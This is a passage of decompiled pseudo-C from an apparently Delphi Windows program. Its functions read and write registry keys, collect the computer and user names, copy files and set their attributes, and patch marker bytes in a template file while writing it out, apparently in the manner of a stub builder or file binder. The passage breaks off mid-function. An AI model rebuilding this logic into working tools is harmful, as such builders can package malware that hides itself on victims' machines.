// 40BE60: using guessed type int (*off_40BE60[5])();
// 415890: using guessed type char var_A[2];

//----- (00415948) --------------------------------------------------------
_DWORD *__usercall sub_415948@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  _DWORD *result; // eax
  unsigned int v7[6]; // [esp-Ch] [ebp-1Ch] BYREF
  _DWORD *v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v8 = sub_402BAC(&off_413628, 1);
  v7[2] = (unsigned int)&savedregs;
  v7[1] = (unsigned int)&loc_415988;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v8[2] = a2;
  v8[3] = a3;
  __writefsdword(0, v7[0]);
  sub_415580((int)v8);
  sub_415584(*(_DWORD **)(a1 + 32));
  result = v8;
  *(_DWORD *)(a1 + 32) = v8;
  return result;
}
// 413628: using guessed type int (*off_413628)();

//----- (004159BC) --------------------------------------------------------
int __usercall sub_4159BC@<eax>(int a1@<eax>, int a2@<edx>)
{
  sub_415948(a1, a2, 0);
  return (*(int (**)(void))(*(_DWORD *)a1 + 16))();
}

//----- (004159D4) --------------------------------------------------------
void __usercall sub_4159D4(int a1@<eax>, int a2@<edx>)
{
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 32) + 8) )
    sub_414390((int **)off_41DB28[0]);
  else
    *(_DWORD *)(a1 + 40) = a2;
}
// 41DB28: using guessed type int *off_41DB28[2];

//----- (004159F0) --------------------------------------------------------
void __usercall sub_4159F0(int a1@<eax>, int a2@<edx>)
{
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 32) + 8) )
    sub_414390((int **)off_41DB28[0]);
  else
    *(_DWORD *)(a1 + 36) = a2;
}
// 41DB28: using guessed type int *off_41DB28[2];

//----- (00415A08) --------------------------------------------------------
void __usercall sub_415A08(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // ebx
  int v5; // eax

  sub_4157DC(a1);
  v4 = *(_DWORD *)(a1[8] + 12);
  v5 = sub_40D84C(v4);
  sub_40D8BC(a2, *(_DWORD *)(v4 + 4), v5);
}

//----- (00415A34) --------------------------------------------------------
void __stdcall sub_415A34(int a1)
{
  sub_414390(off_41DAD0);
}
// 41DAD0: using guessed type int **off_41DAD0;

//----- (00415A48) --------------------------------------------------------
void __stdcall sub_415A48(int a1)
{
  sub_414390(off_41DAD0);
}
// 41DAD0: using guessed type int **off_41DAD0;

//----- (00415A5C) --------------------------------------------------------
HPALETTE sub_415A5C()
{
  HDC DC; // ebx
  HPALETTE result; // eax

  DC = GetDC(0);
  nNumerator = GetDeviceCaps(DC, 90);
  ReleaseDC(0, DC);
  result = sub_414678(byte_41DA74);
  ho = result;
  return result;
}

//----- (00415A94) --------------------------------------------------------
int __usercall sub_415A94@<eax>(int a1@<ebx>)
{
  HDC DC; // esi
  struct tagTEXTMETRICA v3; // [esp+0h] [ebp-40h] BYREF

  LOBYTE(a1) = 1;
  DC = GetDC(0);
  if ( DC )
  {
    if ( SelectObject(DC, dword_41E688) && GetTextMetricsA(DC, &v3) )
      LOBYTE(a1) = v3.tmCharSet;
    ReleaseDC(0, DC);
  }
  return a1;
}

//----- (00415AD8) --------------------------------------------------------
char __usercall sub_415AD8@<al>(int a1@<ebx>)
{
  int v1; // eax
  char v2; // bl

  dword_41D830 = -MulDiv(8, nNumerator, 72);
  LOBYTE(v1) = (_BYTE)off_41DC84;
  if ( *((_BYTE *)off_41DC84 + 8) )
  {
    v2 = sub_415A94(a1);
    LOBYTE(v1) = v2 + 0x80;
    if ( v2 == (char)0x80 )
    {
      qmemcpy(aMsSansSerif, dword_415B3C, 0x10u);
      v1 = -MulDiv(9, nNumerator, 72);
      dword_41D830 = v1;
      byte_41D836 = v2;
    }
  }
  return v1;
}
// 415B3C: using guessed type int dword_415B3C[4];
// 41D830: using guessed type int dword_41D830;
// 41D836: using guessed type char byte_41D836;
// 41DC84: using guessed type void *off_41DC84;

//----- (00415BA8) --------------------------------------------------------
_DWORD *__usercall sub_415BA8@<eax>(int a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi

  if ( a2 )
    a1 = sub_402CDC(a1, a2);
  v2 = a2;
  v3 = (_DWORD *)a1;
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 415BB6: variable 'a2' is possibly undefined

//----- (00415BE0) --------------------------------------------------------
void __usercall sub_415BE0(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_415C24((int)v2);
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v5 + 2));
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 415BE7: variable 'v3' is possibly undefined

//----- (00415C0C) --------------------------------------------------------
void __usercall sub_415C0C(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00415C18) --------------------------------------------------------
void __usercall sub_415C18(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00415C24) --------------------------------------------------------
_DWORD *__usercall sub_415C24@<eax>(int a1@<eax>)
{
  _DWORD *v1; // eax
  _DWORD *result; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  _DWORD *v5; // [esp+0h] [ebp-Ch]
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v7 = a1;
  while ( 1 )
  {
    result = *(_DWORD **)(v7 + 4);
    if ( !result )
      break;
    v6 = *(_DWORD *)(v7 + 4);
    v5 = result;
    sub_415C0C(v7);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_415C6F;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    *(_DWORD *)(v7 + 4) = *v5;
    __writefsdword(0, v3[0]);
    v4 = (int *)&loc_415C76;
    sub_415C18(v7);
    v1 = (_DWORD *)v5[1];
    if ( v1 )
      sub_402BDC(v1);
    sub_4025B0(v6);
  }
  return result;
}

//----- (00415C9C) --------------------------------------------------------
int sub_415C9C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_415D65;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E678 )
  {
    sub_402BDC((_DWORD *)dword_41E6D0);
    sub_402BDC((_DWORD *)dword_41DA6C);
    sub_402BDC((_DWORD *)dword_41DA68);
    sub_415434();
    sub_402BDC((_DWORD *)dword_41DA70);
    sub_402BDC((_DWORD *)dword_41E6CC);
    sub_402BDC((_DWORD *)dword_41E6C0);
    sub_402BDC((_DWORD *)dword_41E6C4);
    sub_402BDC((_DWORD *)dword_41E6C8);
    DeleteObject(ho);
    DeleteCriticalSection_0(&stru_41E690);
    DeleteCriticalSection_0(&stru_41E6A8);
    sub_403BE8(&dword_41D9A8, (char *)dword_40BE88, 18);
    sub_403BE8(&dword_41D858, (char *)dword_40BE88, 42);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40BE88: using guessed type int dword_40BE88[6];
// 41D858: using guessed type int dword_41D858;
// 41D9A8: using guessed type int dword_41D9A8;
// 41DA68: using guessed type int dword_41DA68;
// 41DA6C: using guessed type int dword_41DA6C;
// 41DA70: using guessed type int dword_41DA70;
// 41E678: using guessed type int dword_41E678;
// 41E6C0: using guessed type int dword_41E6C0;
// 41E6C4: using guessed type int dword_41E6C4;
// 41E6C8: using guessed type int dword_41E6C8;
// 41E6CC: using guessed type int dword_41E6CC;
// 41E6D0: using guessed type int dword_41E6D0;

//----- (00415D70) --------------------------------------------------------
void __usercall sub_415D70(int a1@<ebx>)
{
  if ( dword_41E678-- == 0 )
  {
    sub_415A5C();
    InitializeCriticalSection_0(&stru_41E690);
    InitializeCriticalSection_0(&stru_41E6A8);
    h = GetStockObject(7);
    dword_41E684 = GetStockObject(5);
    dword_41E688 = GetStockObject(13);
    dword_41E68C = (int)LoadIconA(0, (LPCSTR)0x7F00);
    sub_415AD8(a1);
    dword_41E6C0 = (int)sub_41376C((int)dword_413758, 1, 44);
    dword_41E6C4 = (int)sub_41376C((int)dword_413758, 1, 16);
    dword_41E6C8 = (int)sub_41376C((int)dword_413758, 1, 16);
    dword_41E6D0 = (int)sub_415BA8((int)dword_415B98, 1);
    dword_41DA70 = (int)sub_40C358(dword_40B96C, 1);
    dword_41E6CC = (int)sub_40C358(dword_40B96C, 1);
    sub_40C000((int)dword_4133A4, (int)sub_413B5C, (int)sub_413B4C);
    sub_40C000((int)dword_413480, (int)sub_413D30, (int)sub_413D20);
  }
}
// 40B96C: using guessed type int dword_40B96C[3];
// 4133A4: using guessed type int dword_4133A4[5];
// 413480: using guessed type int dword_413480[6];
// 413758: using guessed type int dword_413758[5];
// 415B98: using guessed type int dword_415B98[4];
// 41DA70: using guessed type int dword_41DA70;
// 41E678: using guessed type int dword_41E678;
// 41E68C: using guessed type int dword_41E68C;
// 41E6C0: using guessed type int dword_41E6C0;
// 41E6C4: using guessed type int dword_41E6C4;
// 41E6C8: using guessed type int dword_41E6C8;
// 41E6CC: using guessed type int dword_41E6CC;
// 41E6D0: using guessed type int dword_41E6D0;

//----- (00415E74) --------------------------------------------------------
int sub_415E74()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_415E99;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E6D4;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E6D4: using guessed type int dword_41E6D4;

//----- (00415EA4) --------------------------------------------------------
void sub_415EA4()
{
  --dword_41E6D4;
}
// 41E6D4: using guessed type int dword_41E6D4;

//----- (00415EAC) --------------------------------------------------------
int __userpurge sub_415EAC@<eax>(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>, volatile __int32 *a4, int a5, int a6)
{
  int v6; // eax
  _DWORD *v7; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v10; // [esp-8h] [ebp-20h]
  int *v11; // [esp-4h] [ebp-1Ch]
  void *v12; // [esp+0h] [ebp-18h]
  char *v13; // [esp+8h] [ebp-10h] BYREF
  char *v14; // [esp+Ch] [ebp-Ch]
  char *v15; // [esp+10h] [ebp-8h]
  __int32 v16; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v13 = 0;
  v14 = a3;
  v15 = a2;
  v16 = a1;
  sub_4038D8(a1);
  sub_4038D8((int)v15);
  sub_4038D8((int)v14);
  v11 = &savedregs;
  v10 = &loc_415F9C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4034C8(&v13);
  v6 = sub_40E6C4((int)dword_40E610, 1);
  v7 = (_DWORD *)v6;
  if ( a5 == 1 )
  {
    sub_40E764(v6, HKEY_LOCAL_MACHINE);
  }
  else if ( a5 == 2 )
  {
    sub_40E764(v6, HKEY_CLASSES_ROOT);
  }
  else
  {
    sub_40E764(v6, HKEY_CURRENT_USER);
  }
  sub_40E7C8((int)v7, v16, 1);
  if ( (unsigned __int8)sub_40EAE4((int)v7, v15, (int)v7) )
    sub_40E990((int)v7, v15, &v13);
  if ( a6 == 1 )
    sub_40E964((int)v7, v15, v14);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*v7 - 4))(ExceptionList);
  sub_40351C(a4, (__int32)v13);
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_415FA3;
  return sub_4034EC((int)&v13, 4);
}
// 40E610: using guessed type int dword_40E610[2];

//----- (00415FAC) --------------------------------------------------------
_DWORD *__usercall sub_415FAC@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>)
{
  int v3; // ebx
  int v4; // esi
  int v5; // edi
  unsigned int v7[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v8; // [esp-4h] [ebp-2Ch]
  char *v9; // [esp+Ch] [ebp-1Ch] BYREF
  char *v10; // [esp+10h] [ebp-18h] BYREF
  char *v11; // [esp+14h] [ebp-14h] BYREF
  int v12; // [esp+18h] [ebp-10h]
  volatile __int32 *v13; // [esp+1Ch] [ebp-Ch]
  int v14; // [esp+20h] [ebp-8h]
  int v15; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v9 = 0;
  v10 = 0;
  v11 = 0;
  v13 = a3;
  v14 = a2;
  v15 = a1;
  sub_4038D8(a1);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_41608C;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_4034C8(&v11);
  v3 = 6;
  v12 = sub_403724(v15);
  v4 = v12;
  if ( v12 > 0 )
  {
    v5 = 1;
    do
    {
      if ( ++v3 == 8 )
        v3 = 4;
      if ( v14 == 1 )
      {
        sub_403670(&v10);
        sub_40372C(&v11, (__int32)v10);
      }
      else
      {
        sub_403670(&v9);
        sub_40372C(&v11, (__int32)v9);
      }
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  sub_40351C(v13, (__int32)v11);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_416093;
  sub_4034EC((int)&v9, 3);
  return sub_4034C8(&v15);
}

//----- (0041609C) --------------------------------------------------------
int __usercall sub_41609C@<eax>(int a1@<eax>, char **a2@<edx>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v5; // [esp-4h] [ebp-14h]
  UINT uSize; // [esp+4h] [ebp-Ch] BYREF
  LPSTR lpBuffer; // [esp+8h] [ebp-8h]
  char **v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v8 = a2;
  uSize = 261;
  lpBuffer = (LPSTR)sub_402598(261);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41616A;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  switch ( a1 )
  {
    case 1:
      GetWindowsDirectoryA(lpBuffer, uSize);
      break;
    case 2:
      GetSystemDirectoryA(lpBuffer, uSize);
      break;
    case 3:
      GetCurrentDirectoryA(uSize, lpBuffer);
      break;
    case 4:
      GetComputerNameA(lpBuffer, &uSize);
      break;
    case 5:
      GetUserNameA(lpBuffer, &uSize);
      break;
    case 6:
      GetTempPathA(0x104u, lpBuffer);
      break;
    default:
      break;
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_416171;
  sub_403680(v8, lpBuffer);
  return sub_4025B0((int)lpBuffer);
}

//----- (00416178) --------------------------------------------------------
int __usercall sub_416178@<eax>(char *a1@<eax>, char *a2@<edx>, char a3@<cl>)
{
  int v3; // ebx
  char *v4; // eax
  char *v6; // [esp-14h] [ebp-24h]
  unsigned int v7[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v8; // [esp-4h] [ebp-14h]
  char v9; // [esp+7h] [ebp-9h]
  char *v10; // [esp+8h] [ebp-8h] BYREF
  char *v11; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = a3;
  v10 = a2;
  v11 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v10);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4161FD;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v3 = 0;
  if ( !sub_4071A8(v10) )
  {
    v6 = sub_4038E8(v10);
    v4 = sub_4038E8(v11);
    CopyFileA(v4, v6, 0);
    if ( v9 )
      sub_4071B8(v10, 2u);
    LOBYTE(v3) = 1;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_416204;
  sub_4034EC((int)&v10, 2);
  return v3;
}

//----- (0041620C) --------------------------------------------------------
int __usercall sub_41620C@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v3; // ebx
  unsigned int v5[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v6; // [esp-4h] [ebp-24h]
  char v7[4]; // [esp+8h] [ebp-18h] BYREF
  unsigned __int8 v8; // [esp+Ch] [ebp-14h] BYREF
  char v9; // [esp+Dh] [ebp-13h]
  char v10[4]; // [esp+10h] [ebp-10h] BYREF
  char v11[4]; // [esp+14h] [ebp-Ch] BYREF
  char *v12; // [esp+18h] [ebp-8h] BYREF
  int v13; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a1;
  sub_4038D8(a1);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_4162CE;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v3 = sub_403724(v13);
  v11[1] = *(_BYTE *)(v13 + v3 - 3);
  v11[0] = 1;
  sub_402848(v10, v11);
  v9 = *(_BYTE *)(v13 + v3 - 2);
  v8 = 1;
  sub_402818((unsigned __int8 *)v10, &v8, 2u);
  sub_402848(v7, v10);
  v9 = *(_BYTE *)(v13 + v3 - 1);
  v8 = 1;
  sub_402818((unsigned __int8 *)v7, &v8, 3u);
  sub_4036EC(&v12, v7);
  sub_406D90(v12, a2);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_4162D5;
  return sub_4034EC((int)&v12, 2);
}
// 41620C: using guessed type char var_C[4];
// 41620C: using guessed type char var_10[4];
// 41620C: using guessed type char var_18[4];

//----- (004162DC) --------------------------------------------------------
int __usercall sub_4162DC@<eax>(int a1@<eax>, int a2@<edx>, int *a3@<ecx>)
{
  int v4; // edi
  int v5; // esi
  _BYTE *v6; // ebx
  char v7; // zf
  int v8; // edx
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v12; // [esp-4h] [ebp-1Ch]
  char *v13; // [esp+Ch] [ebp-Ch] BYREF
  int *v14; // [esp+10h] [ebp-8h]
  int v15; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v13 = 0;
  v14 = a3;
  v15 = a2;
  sub_4038D8(a2);
  sub_4038D8((int)v14);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_41638C;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v4 = a1;
  if ( a1 > 0 )
  {
    v5 = 1;
    v6 = &unk_41E6D8;
    while ( 1 )
    {
      if ( *v6 == 70 && v6[1] == 65 )
      {
        sub_403670(&v13);
        sub_403834((int)v13, v14);
        if ( v7 )
          break;
      }
      ++v5;
      ++v6;
      if ( !--v4 )
        goto LABEL_11;
    }
    v8 = sub_403724(v15);
    if ( v8 > 0 )
    {
      v9 = 1;
      do
      {
        byte_41E6D9[v9 + v5] = *(_BYTE *)(v15 + v9 - 1);
        ++v9;
        --v8;
      }
      while ( v8 );
    }
  }
LABEL_11:
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_416393;
  return sub_4034EC((int)&v13, 3);
}
// 416341: variable 'v7' is possibly undefined

//----- (0041639C) --------------------------------------------------------
_DWORD *__userpurge sub_41639C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5)
{
  int v7; // edx
  int v8; // edi
  _BYTE *v9; // eax
  int v10; // esi
  int v11; // ebx
  unsigned int v13[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v14; // [esp-4h] [ebp-18h]
  char *v15; // [esp+Ch] [ebp-8h] BYREF
  int v16; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v15 = 0;
  v16 = a2;
  sub_4038D8(a4);
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_416468;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  v7 = a1;
  if ( a1 > 0 )
  {
    v8 = 1;
    v9 = &unk_41E6D8;
    while ( *v9 != 0xC0 || v9[1] != 0xC0 || v9[2] != 0xC0 || v9[4] != 0x80 || v9[5] != 0x80 || v9[6] != 0x80 )
    {
      ++v8;
      ++v9;
      if ( !--v7 )
        goto LABEL_17;
    }
    v10 = a3;
    if ( a3 > 0 )
    {
      v11 = 1;
      do
      {
        if ( v16 == 1 )
        {
          *((_BYTE *)&dword_41E6D4 + v11 + v8 + 3) = *(_BYTE *)(a4 + v11 - 1);
        }
        else
        {
          sub_403670(&v15);
          sub_40372C((char **)(a5 - 4), (__int32)v15);
        }
        ++v11;
        --v10;
      }
      while ( v10 );
    }
  }
LABEL_17:
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_41646F;
  sub_4034C8(&v15);
  return sub_4034C8(&a4);
}
// 41E6D4: using guessed type int dword_41E6D4;

//----- (00416478) --------------------------------------------------------
int __userpurge sub_416478@<eax>(
        char *a1@<eax>,
        char *a2@<edx>,
        char *a3@<ecx>,
        char a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        char *a10)
{
  char *v10; // eax
  HICON IconA; // eax
  int v12; // esi
  char *v13; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *v15; // [esp-18h] [ebp-53Ch] BYREF
  void *v16; // [esp-14h] [ebp-538h]
  int *v17; // [esp-10h] [ebp-534h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-530h] BYREF
  void *v19; // [esp-8h] [ebp-52Ch]
  int *v20; // [esp-4h] [ebp-528h]
  void *v21; // [esp+0h] [ebp-524h]
  char *v22; // [esp+8h] [ebp-51Ch] BYREF
  char v23[256]; // [esp+Ch] [ebp-518h] BYREF
  char *v24; // [esp+10Ch] [ebp-418h] BYREF
  char *v25; // [esp+110h] [ebp-414h] BYREF
  __int32 v26; // [esp+114h] [ebp-410h] BYREF
  int v27[83]; // [esp+118h] [ebp-40Ch] BYREF
  int v28[83]; // [esp+264h] [ebp-2C0h] BYREF
  int v29[83]; // [esp+3B0h] [ebp-174h] BYREF
  _DWORD *v30; // [esp+4FCh] [ebp-28h]
  char v31; // [esp+503h] [ebp-21h] BYREF
  char *v32; // [esp+504h] [ebp-20h] BYREF
  int v33; // [esp+508h] [ebp-1Ch] BYREF
  int v34; // [esp+50Ch] [ebp-18h]
  int v35; // [esp+510h] [ebp-14h] BYREF
  char *v36; // [esp+514h] [ebp-10h] BYREF
  char *v37; // [esp+518h] [ebp-Ch]
  char *v38; // [esp+51Ch] [ebp-8h]
  int v39; // [esp+520h] [ebp-4h] BYREF
  int savedregs; // [esp+524h] [ebp+0h] BYREF

  v22 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v32 = 0;
  v39 = 0;
  v36 = a3;
  v37 = a2;
  v38 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v37);
  sub_4038D8((int)v36);
  sub_4038D8((int)a10);
  sub_4038D8(a9);
  sub_4038D8(a8);
  sub_4038D8(a7);
  v20 = &savedregs;
  v19 = &loc_4168AD;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_415EAC(dword_41EEFC, (char *)dword_4168D0, (char *)dword_4168C4, &v26, 1, 1);
  v34 = 0;
  sub_4034C8(&v39);
  sub_403670(&v25);
  v33 = sub_403724((int)v25);
  sub_404E16(v29, v38);
  sub_403770((volatile __int32 *)&v24, v36, a10);
  sub_404E16(v28, v24);
  *off_41DC30 = 0;
  if ( a5 == 1 )
  {
    sub_40296C(a6, v23);
    sub_4036EC(&v32, v23);
  }
  else
  {
    sub_403560((volatile __int32 *)&v32, (__int32)"        ");
  }
  sub_40510D((int)v29, 1);
  sub_40265C();
  sub_405124((int)v28, 1);
  sub_40265C();
  if ( a4 )
  {
    v30 = sub_4155EC(&off_413684, 1);
    v17 = &savedregs;
    v16 = &loc_416673;
    v15 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v15);
    sub_415FAC((int)dword_4168F0, 0, (volatile __int32 *)&v22);
    sub_403770(&dword_41EEF4, (char *)dword_41EEF0, v22);
    v10 = sub_4038E8(v37);
    IconA = ExtractIconA(hInst, v10, 0);
    sub_4159BC((int)v30, (int)IconA);
    (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v30 + 76))(
      v15,
      v16,
      v17,
      ExceptionList);
    sub_4071B8((char *)dword_41EEF4, 2u);
    __writefsdword(0, (unsigned int)v19);
    v21 = &loc_41667A;
    sub_402BDC(v30);
    sub_404E16(v27, (char *)dword_41EEF4);
    sub_40510D((int)v27, 1);
    sub_40265C();
    do
    {
      sub_404EB8((int)v27, &unk_41E6D8, 2048, (DWORD *)&v35);
      sub_40265C();
      sub_41639C(v35, 0, 676, 0, (int)&savedregs);
    }
    while ( v35 );
    sub_404F80((int)v27);
    sub_40265C();
  }
  do
  {
    sub_404EB8((int)v29, &unk_41E6D8, 2048, (DWORD *)&v35);
    sub_40265C();
    sub_4162DC(v35, a9, dword_416904);
    sub_4162DC(v35, a7, dword_416910);
    sub_4162DC(v35, (int)v32, dword_41691C);
    sub_4162DC(v35, a8, &dword_416928);
    if ( a4 )
      sub_41639C(v35, 1, 676, v39, (int)&savedregs);
    if ( a5 == 1 )
    {
      sub_404F1C((int)v28, &unk_41E6D8, v35, (DWORD *)&v35);
      sub_40265C();
    }
    else
    {
      v12 = 2048;
      v13 = (char *)&unk_41E6D8;
      do
      {
        v31 = *v13;
        if ( ++v34 <= a6 )
        {
          sub_404F1C((int)v28, &v31, v33, (DWORD *)&v33);
          sub_40265C();
        }
        ++v13;
        --v12;
      }
      while ( v12 );
    }
  }
  while ( v35 );
  if ( a5 == 1 )
  {
    sub_404E16(v27, v37);
    sub_40510D((int)v27, 1);
    sub_40265C();
    do
    {
      sub_404EB8((int)v27, &unk_41E6D8, 2048, (DWORD *)&v35);
      sub_40265C();
      sub_404F1C((int)v28, &unk_41E6D8, v35, (DWORD *)&v35);
      sub_40265C();
    }
    while ( v35 );
    sub_404F80((int)v27);
    sub_40265C();
  }
  sub_404F80((int)v29);
  sub_40265C();
  sub_404F80((int)v28);
  sub_40265C();
  __writefsdword(0, (unsigned int)ExceptionList);
  v20 = (int *)&loc_4168B4;
  sub_4034C8(&v22);
  sub_4034EC((int)&v24, 3);
  sub_4034C8(&v32);
  sub_4034EC((int)&v36, 4);
  return sub_4034EC((int)&a7, 4);
}
// 413684: using guessed type void *off_413684;
// 4168C4: using guessed type int dword_4168C4[3];
// 4168D0: using guessed type int dword_4168D0[3];
// 4168F0: using guessed type int dword_4168F0[3];
// 416904: using guessed type int dword_416904[3];
// 416910: using guessed type int dword_416910[3];
// 41691C: using guessed type int dword_41691C[3];
// 416928: using guessed type int dword_416928;
// 41DC30: using guessed type char *off_41DC30;
// 41EEF0: using guessed type int dword_41EEF0;
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEFC: using guessed type int dword_41EEFC;
// 416478: using guessed type _DWORD var_174[83];
// 416478: using guessed type _DWORD var_2C0[83];
// 416478: using guessed type _DWORD var_40C[83];

//----- (0041692C) --------------------------------------------------------
_DWORD *__userpurge sub_41692C@<eax>(int a1@<eax>, int a2@<edx>, int *a3@<ecx>, volatile __int32 *a4)
{
  _BYTE *v5; // ebx
  char v6; // zf
  int v7; // esi
  int v8; // edi
  unsigned int v10[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v11; // [esp-4h] [ebp-2Ch]
  char *v12; // [esp+Ch] [ebp-1Ch] BYREF
  char *v13; // [esp+10h] [ebp-18h] BYREF
  int v14; // [esp+14h] [ebp-14h]
  char *v15; // [esp+18h] [ebp-10h] BYREF
  int v16; // [esp+1Ch] [ebp-Ch]
  int *v17; // [esp+20h] [ebp-8h] BYREF
  int v18; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v12 = 0;
  v13 = 0;
  v15 = 0;
  v17 = a3;
  v18 = a2;
  sub_4038D8((int)a3);
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_416A09;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_4034C8(&v15);
  if ( a1 > 0 )
  {
    v14 = a1;
    v16 = 1;
    v5 = &unk_41E6D8;
    do
    {
      if ( *v5 == 70 && v5[1] == 65 )
      {
        sub_403670(&v13);
        sub_403834((int)v13, v17);
        if ( v6 )
        {
          v7 = v18;
          if ( v18 > 0 )
          {
            v8 = 1;
            do
            {
              sub_403670(&v12);
              sub_40372C(&v15, (__int32)v12);
              ++v8;
              --v7;
            }
            while ( v7 );
          }
        }
      }
      ++v16;
      ++v5;
      --v14;
    }
    while ( v14 );
  }
  sub_40351C(a4, (__int32)v15);
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_416A10;
  sub_4034EC((int)&v12, 2);
